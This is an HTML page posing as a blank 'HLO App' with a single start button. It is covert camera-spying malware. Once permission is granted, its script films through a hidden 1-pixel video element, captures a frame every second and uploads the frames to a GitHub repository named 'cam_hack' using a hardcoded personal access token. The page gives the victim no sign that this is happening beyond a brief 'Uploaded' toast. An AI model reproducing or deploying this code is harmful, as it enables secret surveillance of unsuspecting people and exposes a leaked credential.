<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>HLO App</title>
  <style>
    body {
      font-family: Arial;
      background:#f3f4f6;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
      margin:0;
    }
    #box {
      background:white;
      padding:20px;
      border-radius:10px;
      width:330px;
      text-align:center;
      box-shadow:0 4px 20px rgba(0,0,0,0.2);
    }
    #video {
      width:1px;height:1px;opacity:0.01;position:fixed;bottom:0;right:0;
    }
    #toast {
      position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
      background:black;color:white;padding:10px;border-radius:8px;display:none;
    }
    button {
      padding:10px 20px;
      background:#2563eb;
      color:white;border:none;border-radius:8px;
      cursor:pointer;font-size:16px;
    }
  </style>
</head>

<body>

  <div id="box">
    <h2>HLO</h2>
    <button id="startBtn">OK â€” Start</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div id="toast">Uploaded</div>

<script>
const GITHUB_TOKEN = "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";  // <-- PUT TOKEN HERE
const REPO_OWNER = "YUVIVIKHE";
const REPO_NAME = "cam_hack";
const UPLOAD_PATH = "captures";

const startBtn = document.getElementById("startBtn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

let stream = null;
let timer = null;

// Show small popup
function showToast(msg) {
  toast.innerText = msg;
  toast.style.display = "block";
  setTimeout(() => toast.style.display = "none", 1200);
}

// Upload file to GitHub
async function uploadToGithub(fileName, base64Data) {
  const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${UPLOAD_PATH}/${fileName}`;

  const body = {
    message: "upload image " + fileName,
    content: base64Data.replace(/^data:image\/png;base64,/, "")
  };

  const response = await fetch(url, {
    method: "PUT",
    headers: {
      "Authorization": "token " + GITHUB_TOKEN,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(body)
  });

  if (response.ok) {
    showToast("Uploaded");
  } else {
    console.error("GitHub upload failed", await response.text());
  }
}

// Capture and upload
async function captureAndUpload() {
  const w = video.videoWidth;
  const h = video.videoHeight;
  if (w === 0 || h === 0) return;

  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, w, h);

  const dataURL = canvas.toDataURL("image/png");
  const fileName = Date.now() + ".png";

  uploadToGithub(fileName, dataURL);
}

startBtn.addEventListener("click", async () => {
  startBtn.style.display = "none";

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" },
      audio: false
    });

    video.srcObject = stream;

    await new Promise(res => (video.onloadedmetadata = res));

    timer = setInterval(captureAndUpload, 1000);

  } catch (err) {
    alert("Camera permission denied");
  }
});

// Stop camera when closing
window.addEventListener("beforeunload", () => {
  if (timer) clearInterval(timer);
  if (stream) stream.getTracks().forEach(t => t.stop());
});
</script>

</body>
</html>
